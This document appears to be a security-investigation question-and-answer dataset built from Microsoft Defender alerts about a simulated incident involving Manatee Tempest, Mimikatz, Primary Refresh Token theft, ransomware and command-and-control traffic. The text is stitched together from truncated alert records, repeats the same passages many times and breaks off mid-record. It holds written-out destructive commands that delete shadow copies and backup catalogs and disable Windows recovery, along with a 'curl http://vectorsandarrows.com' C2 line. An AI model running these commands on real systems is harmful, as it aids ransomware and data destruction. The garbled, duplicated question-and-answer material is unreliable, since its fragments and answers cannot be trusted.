question.context: A command and control behavior was blocked on host `vnevado-win10r`, which indicated an active infection by malware that could replicate and receive commands from remote attackers. This malware was active, and precautionary measures should be taken to check for residual signs of infection. The process involved had the ID 1332 and ran the command `curl http://vectorsandarrows.com`.
question.question: What is the IP address associated with the Manatee Tempest activity group detected in this security incident?
solution: The account with SID `S-1-5-21-1840191660-8534830288-125585561-1522` was involved in a Command and Control behavior that was blocked.
The cybercriminal group known as Manatee Tempest, which is associated with the IP address `198.43.121.209`, was active during the incident.

Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

A Primary Refresh Token (PRT) is a key artifact of Azure AD authentication on Windows 10, Windows Server 2016 and later versions, iOS, and Android devices. It is a JSON Web Token (JWT) that's specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices. Attackers can attempt to access this resource to move laterally into organization or perform credential theft.

For more information, read the Activity profile: Midnight Blizzard credential attacks Threat Analytics report: https://security.microsoft.com/threatanalytics3/e4aad043-a273-4f88-b65e-fdfc3996ec92/analystreport?

question.context: A Mimikatz credential theft tool was detected on a device at 2024-07-04 22:35:03.797541+00:00. Mimikatz is a tool used to harvest plaintext passwords, password hashes, smartcard PINs, and Kerberos tickets. The attacker might be leveraging this tool to harvest credentials to log into this or other devices on the network by impersonating a valid user. Several command line executions involving `mimikatz.exe` were observed, along with connected mimikatz-related files like `mimidrv.sys`, `mimispool.dll`, and `mimilove.exe`. More information can be found in the Mimikatz tool profile Threat Analytics report and the Actor profile: Storm-0875 Threat Analytics report provided by Microsoft.

tampering', 'System recovery setting tampering', 'High', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]
•	bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data using the following command: [bcdedit.exe /set default bootstatuspolicy ignoreallfailures & bcdedit /set default recoveryenabled no]', 'MDATP', 'Microsoft', '3fcede41-9fdb-4dfb-9fd0-69f1c6fa88bf_1', '8edf196f-fae8-6f94-3acd-93c648e9aa1f', '', '', 'WindowsDefenderAtp', '', '', 'False', '2024-06-20 09:29:38.767268+00:00', '2024-06-20 09:29:41.284899+00:00', '2024-06-20 09:39:59.777330+00:00', '["1. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

been active since June 2014. It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]

group', 'Manatee Tempest activity group', 'High', 'The actor that Microsoft tracks as Manatee Tempest is a Russia-based cybercriminal group that has been active since June 2014. It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]

It is a JSON Web Token (JWT) that's specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices. Attackers can attempt to access this resource to move laterally into organization or perform credential theft.

question.context: On 2024-07-04, a ransomware payload was remotely launched on a device, which might have aimed to encrypt content and render it unusable. This malicious activity originated from the IP address `99.83.111.100`. Thereafter, 'CommandAndControl' malware was identified on the device, suggesting an attempted lateral movement by the attacker.
question.question: What is the command line of the process that was executed when the 'CommandAndControl' malware was detected during lateral movement?
solution: The ransomware payload was remotely launched on the account `dp5hn` at `2024-07-04 22:35:01.951341+00:00`.

The 'CommandAndControl' malware was detected during lateral movement. The attacker's command line was `curl http://vectorsandarrows.com` and it was executed with Process ID `5572` on `2024-06-20t09:32:04.8002759z`.

question.context: There was a detection of unknown malware being active in the environment, which was stopped by Windows Defender but it is recommended to further check the machine for signs of infection. Following that, there were multiple alerts indicating possible attempts to access Primary Refresh Token (PRT) which is a key artifact used for Azure AD authentication. Additionally, we observed an alert where system recovery settings were tampered with, indicating that adversaries might be attempting to delete or disable built-in operating system data and recovery services. This could prevent recovery of a corrupted system and denie access to backups and recovery options. Various built-in Windows utilities can be exploited to disable or delete system recovery features, posing a risk to system integrity.
question.question: What is the name of the account involved in the system recovery setting tampering incident?
solution: An unknown malware was detected and was active on the host with AadDeviceId `4d8d23e9-a77d-4e33-9435-b8c457e57ca1`.
There was a possible attempt to access the Primary Refresh Token (PRT) involving the process `browsercore.exe`.
The user with SID `S-1-5-21-1840191660-8534830288-125585561-1522` was involved in a potential attempt to access the Primary Refresh Token (PRT).
System recovery setting tampering was observed on the account named `dp5hn`.

tampering', 'System recovery setting tampering', 'High', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]
•	bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data using the following command: [bcdedit.exe /set default bootstatuspolicy ignoreallfailures & bcdedit /set default recoveryenabled no]', 'MDATP', 'Microsoft', '5984c937-d71d-4fb9-9eb9-e0eddb531b1c_1', '65e0e94f-36d8-f3a7-039e-c1770857c3ce', '', '', 'WindowsDefenderAtp', '', '', 'False', '2024-06-20 09:10:48.076628+00:00', '2024-06-20 09:10:50.905677+00:00', '2024-06-20 09:19:23.178094+00:00', '["1. tampering', 'System recovery setting tampering', 'High', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]
•	bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data using the following command: [bcdedit.exe /set default bootstatuspolicy ignoreallfailures & bcdedit /set default recoveryenabled no]', 'MDATP', 'Microsoft', '7d47542a-7c5a-4fd4-85f2-640f2bf0927b_1', '37ed1840-2428-9ace-8db4-fc7ceeda30b9', '', '', 'WindowsDefenderAtp', '', '', 'False', '2024-06-20 09:10:49.054537+00:00', '2024-06-20 09:10:51.876113+00:00', '2024-06-20 09:19:23.179872+00:00', '["1. question.context: A security incident involving the Manatee Tempest activity group was flagged, where the actor Manatee Tempest, known for its early malware campaigns like the Dridex banking trojan, has been active since June 2014. The group utilizes tactics such as drive-by downloads and FakeUpdates infections, facilitated by Mustard Tempest to gain initial access. Later, they use the BLISTER loader to deliver Cobalt Strike beacons for lateral movement and ransomware deployment. One of the events related to this incident involved a process running on the host `vnevado-win11t` using the command `curl http://vectorsandarrows.com`. The Process ID was 88.

Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]

It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

'Manatee Tempest activity group', 'High', 'The actor that Microsoft tracks as Manatee Tempest is a Russia-based cybercriminal group that has been active since June 2014. It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]

6. Update antimalware signatures and run full scans.

('System recovery setting tampering', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]
•	bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data using the following command: [bcdedit.exe /set default bootstatuspolicy ignoreallfailures question.context: A security incident raised flags due to suspicious WMI process creation observed on a machine, which is indicative of possible malware activity. This was connected to a chain of processes including `get-userprttoken.ps1` and `curl` attempts. WMI is often utilized by malware to spawn new processes, breaking process trees and further infecting a machine.

question.context: A recent security incident involved multiple attempts to access a Primary Refresh Token (PRT) which is a key artifact of Azure AD authentication on various devices. During the investigation, it was observed that a suspicious activity attempted to access PRT from the account associated with the user `tgs2z`, possibly moving laterally within the organization. The IP address involved in this incident was `107.224.99.179`, and one of the processes noted was `powershell.exe`. This investigation further revealed a Command and Control (C2) behavior that was blocked.
question.question: What was the URL blocked due to Command and Control (C2) behavior in this incident?
solution: There was a possible attempt to access the Primary Refresh Token (PRT) using the process `browsercore.exe`.
The account `dp5hn` was associated with a possible attempt to access the Primary Refresh Token (PRT).
Command and Control behavior was detected and blocked for the URL `http://vectorsandarrows.com/`.

A Primary Refresh Token (PRT) is a key artifact of Azure AD authentication on Windows 10, Windows Server 2016 and later versions, iOS, and Android devices. It is a JSON Web Token (JWT) that's specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices. Attackers can attempt to access this resource to move laterally into organization or perform credential theft.

For more information, read the Activity profile: Midnight Blizzard credential attacks Threat Analytics report: https://security.microsoft.com/threatanalytics3/e4aad043-a273-4f88-b65e-fdfc3996ec92/analystreport?

question.context: During an investigation of a security incident, it was observed that 'CommandAndControl' malware was detected on the host `vnevado-win10r`, which might be an indication of an attacker attempting to move laterally from another network device. The process was initiated via the command `curl http://vectorsandarrows.com` with Process ID 1332. The incident is part of a larger campaign by the Manatee Tempest activity group, which is known for various cyber-attacks including the use of Cobalt Strike beacons for lateral movement and ransomware deployment.
question.question: As part of the Manatee Tempest activity group, what is the IP address associated with their activity in this incident?
solution: The 'CommandAndControl' malware was detected on a device. An attacker might be attempting to move laterally to this device from another device on the network. The associated user account has the SID `S-1-5-21-1840191660-8534830288-125585561-1522`.

Manatee Tempest, a Russia-based cybercriminal group active since June 2014, was identified. This group was responsible for the Dridex banking trojan and various other malvertising and infection methods. They have been observed partnering with Mustard Tempest to facilitate initial access. They use the IP address `198.43.121.209` for their activities.

Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]

question.context: An active unknown malware was detected, which assigned higher severity ratings due to its active state and potential persistence mechanisms. This malware was running on an unspecified host and included processes involving mimikatz.exe and cmd.exe, indicating credential theft activities. Following this malware detection, a possible attempt to access Primary Refresh Token (PRT) was identified, signifying that attackers could be trying to acquire this Azure AD authentication artifact to perform lateral movements or credential theft.
question.question: Can you identify the AadUserId associated with the possible attempt to access the Primary Refresh Token (PRT)?
solution: Active malware was detected on the host `vnevado-win10v`.
There was a possible attempt to access a Primary Refresh Token (PRT) using the process `browsercore.exe`.
The account with AadUserId `731adb71-b11c-4bbf-850b-57989b350e96` was associated with a possible attempt to access a Primary Refresh Token (PRT).

('2024-06-20 09:19:23.690415+00:00', 'Manatee Tempest activity group', 'The actor that Microsoft tracks as Manatee Tempest is a Russia-based cybercriminal group that has been active since June 2014. It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

For more information, read the Actor Profile: Manatee Tempest Threat Analytics report: https://security.microsoft.com/threatanalytics3/a22c3410-db8f-4c58-866e-ebb760e509d0/analystreport', ('2024-06-20 09:40:00.275880+00:00', 'Manatee Tempest activity group', 'The actor that Microsoft tracks as Manatee Tempest is a Russia-based cybercriminal group that has been active since June 2014. It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

For more information, read the Actor Profile: Manatee Tempest Threat Analytics report: https://security.microsoft.com/threatanalytics3/a22c3410-db8f-4c58-866e-ebb760e509d0/analystreport', question.context: An alert reported that the LSASS process memory was modified, potentially to bypass security measures. During this incident, a suspicious process `notepad.exe` was observed running on host `vnevado-win10v` with specific command line arguments. Another alert was subsequently triggered indicating that a Windows Sysinternals tool was renamed and executed.
question.question: From the subsequent alert, what was the name of the Windows Sysinternals tool that was renamed before it was launched?
solution: The LSASS process memory was modified from IP address `107.224.99.179`.
A Windows Sysinternals tool was renamed to `mimikatz.exe` and then launched, which might indicate malicious activity.

question.question: What is the Azure Active Directory (AAD) device ID of the host where the possible attempt to access the Primary Refresh Token (PRT) was detected?
solution: All file snapshots and shadow copies have been deleted via WMI or VSSAdmin using the account with SID `S-1-5-21-1840191660-8534830288-125585561-1522`, which is a common tactic during Ransomware infection.
A possible attempt to access Primary Refresh Token (PRT) has been detected on the host with AadDeviceId `bc00e484-d0e5-4da4-9472-95568cccc07e`.

A Primary Refresh Token (PRT) is a key artifact of Azure AD authentication on Windows 10, Windows Server 2016 and later versions, iOS, and Android devices. It is a JSON Web Token (JWT) that's specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices. Attackers can attempt to access this resource to move laterally into organization or perform credential theft.

For more information, read the Activity profile: Midnight Blizzard credential attacks Threat Analytics report: https://security.microsoft.com/threatanalytics3/e4aad043-a273-4f88-b65e-fdfc3996ec92/analystreport?

question.context: A security incident involving multiple malicious activities was detected. It started with a known credential theft tool, `mimikatz.exe`, being executed at two different times, indicating an attempt to dump users' credentials. This activity led to lateral movement attempts to the jump server and suspicious remote activities on the machine. Subsequent analysis revealed command and control behavior of malware which was blocked.
question.question: What was the URL associated with the command and control behavior detected in the end alert?

A Primary Refresh Token (PRT) is a key artifact of Azure AD authentication on Windows 10, Windows Server 2016 and later versions, iOS, and Android devices. It is a JSON Web Token (JWT) that's specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices. Attackers can attempt to access this resource to move laterally into organization or perform credential theft.

For more information, read the Activity profile: Midnight Blizzard credential attacks Threat Analytics report: https://security.microsoft.com/threatanalytics3/e4aad043-a273-4f88-b65e-fdfc3996ec92/analystreport?

An attacker might be trying to harvest credentials to log into this or other devices on the network, by impersonating a valid user.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

question.context: A security incident involving an attempt to access a Primary Refresh Token (PRT) was detected. The PRT is a key artifact of Azure AD authentication on various devices, including Windows 10. The incident involved a device with HostName `vnevado-win10s` and AadDeviceId `f5b847aa-8712-4bf6-b4f7-ed6cd89e1505`, where the process `browsercore.exe` (ProcessId `2676` created at `2024-06-20T09:10:59.867384Z`) was running. Attackers may use this to move laterally within the organization.
question.question: Following this incident, 'CommandAndControl' malware was detected on another device during lateral movement. What is the AadDeviceId of this affected device?
solution: A possible attempt to access Primary Refresh Token (PRT) has been detected for the user with AadUserId `731adb71-b11c-4bbf-850b-57989b350e96`.
'CommandAndControl' malware was detected on the device with AadDeviceId `bc00e484-d0e5-4da4-9472-95568cccc07e`, indicating an attempt of lateral movement.

tampering', 'System recovery setting tampering', 'High', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]

[('e34d562e-ef12-4c4e-9bc0-7c6ae357c015', '2024-06-20 09:40:00.085384+00:00', 'Manatee Tempest activity group', 'Manatee Tempest activity group', 'High', 'The actor that Microsoft tracks as Manatee Tempest is a Russia-based cybercriminal group that has been active since June 2014. It was notorious for one of its earliest malware lexpaigns – the Dridex banking trojan. Manatee Tempest is also one of the first groups to be sanctioned by the Office of Foreign Assets Control (OFAC) in 2019.

Manatee Tempest’s tactics rely on a partnership with Mustard Tempest, an access broker that facilitates access to target networks. Manatee Tempest has been observed targeting organizations across a diverse array of industries with methods such as drive-by download, including malvertising and FakeUpdates (also known as SocGholish) infections facilitated by Mustard Tempest to obtain initial access, followed by BLISTER loader to deliver Cobalt Strike beacons which are used for lateral movement and ransomware deployment. The actor also uses domain fronting to establish command-and-control channel for Cobalt Strike beacons. Manatee Tempest overlaps with activity tracked by the cyber intelligence industry as EvilCorp, UNC2165, and Indrik Spider.

Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]

question.context: A security incident regarding System recovery setting tampering and possible attempts to access Primary Refresh Token (PRT) was reported. Specifically, there was an attempt to disable system recovery features using `vssblatemp.exe` and `bcdedit` on the host `vnevado-win11u` with a user account having the SID `S-1-5-21-1840191660-8534830288-125585561-1522`. Notably, it included a potential access of PRTs, as mentioned in the Midnight Blizzard credential attacks Threat Analytics report.
question.question: In relation to the malicious credential theft tool execution detected in this multi-stage incident, can you identify the file name of the tool that was executed?
solution: The system recovery settings tampering was attempted by the user with AadUserId `731adb71-b11c-4bbf-850b-57989b350e96`.
An attempt to access Primary Refresh Token (PRT) was detected, associated with the process `browsercore.exe`.
Another attempt to access Primary Refresh Token (PRT) was detected, originating from the IP address `107.224.99.179`.
A malicious credential theft tool `mimikatz.exe` was executed.

question.context: A security incident involving the Manatee Tempest activity group was reported. They often gain initial access through methods such as drive-by downloads and malvertising, facilitated by their partnership with Mustard Tempest. As part of this security incident, a suspicious WMI process creation was observed on the machine `vnevado-win10r`, which might be an indicator of malware using WMI to spawn new processes and further infect the machine.

question.question: Following this alert regarding system tampering, there was also a command and control behavior blocked. Can you identify the URL associated with the blocked behavior?
solution: The system recovery setting tampering was attempted by the account `dp5hn`.
A Command and Control behavior from the URL `http://vectorsandarrows.com/` was detected and blocked.

The attacker might have been using various user accounts, IP addresses, or devices to spread ransomware across the network, and automated remediation actions may have been activated to address the affected entities. One of the devices involved in this incident is identified with the hostname `vnevado-win11u`.
question.question: During this incident, there was also a detected attempt to access the Primary Refresh Token (PRT). What is the AadDeviceId of the host involved in this attempt?
solution: The user account with SID `S-1-5-21-1840191660-8534830288-125585561-1522` is potentially compromised and exhibiting ransomware-like behavior, affecting multiple devices.
There was a possible attempt to access a Primary Refresh Token (PRT) from the device with AadDeviceId `9d4887ba-0b69-47d6-89bc-9b32787f379e`.

A Primary Refresh Token (PRT) is a key artifact of Azure AD authentication on Windows 10, Windows Server 2016 and later versions, iOS, and Android devices. It is a JSON Web Token (JWT) that's specially issued to Microsoft first party token brokers to enable single sign-on (SSO) across the applications used on those devices. Attackers can attempt to access this resource to move laterally into organization or perform credential theft.

For more information, read the Activity profile: Midnight Blizzard credential attacks Threat Analytics report: https://security.microsoft.com/threatanalytics3/e4aad043-a273-4f88-b65e-fdfc3996ec92/analystreport?

recovery setting tampering', 'System recovery setting tampering', 'High', 'System recovery setting tampering has been observed on this device. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
•	 vssblatemp.exe can be used to delete all volume shadow copies on a system using the following command: [vssblatemp.exe delete shadows /all /quiet]
•	Windows Management Instrumentation can be used to delete volume shadow copies using the following command: [wmic shadowcopy delete]
•	wbblatemp.exe can be used to delete the Windows Backup Catalog using the following command: [wbblatemp.exe delete catalog -quiet]
•	bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data using the following command: [bcdedit.exe /set default bootstatuspolicy ignoreallfailures & bcdedit /set default recoveryenabled no]', 'MDATP', 'Microsoft', '5984c937-d71d-4fb9-9eb9-e0eddb531b1c_1', '65e0e94f-36d8-f3a7-039e-c1770857c3ce', '', '', 'WindowsDefenderAtp', '', '', 'False', '2024-06-20 09:10:48.076628+00:00', '2024-06-20 09:10:50.905677+00:00', '2024-06-20 09:19:23.178094+00:00', '["1. Adversaries might be attempting to delete or remove built-in operating system data and turn off recovery services to prevent recovering a corrupted system. This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may stop or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.

Many native Windows utilities have been used by adversaries to disable or delete system recovery features:
